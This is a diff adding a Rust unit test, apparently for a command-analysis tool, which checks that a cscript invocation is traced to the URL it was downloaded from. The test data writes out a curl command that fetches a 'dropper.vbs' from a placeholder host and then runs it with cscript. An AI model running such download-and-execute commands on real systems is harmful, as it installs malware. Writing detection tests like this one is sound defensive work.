@@ -10228,6 +10228,28 @@ wscript loader.js
             );
         }
     }
+
+    #[test]
+    fn cscript_basename_resolves_full_path_download_source_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\dropper.vbs https://script-host-basename.example/dropper.vbs"#,
+            &mut env,
+        );
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "cscript //nologo dropper.vbs"
+                            && url == "https://script-host-basename.example/dropper.vbs"
+                )
+            }),
+            "cscript basename did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
 }
 
 #[cfg(test)]
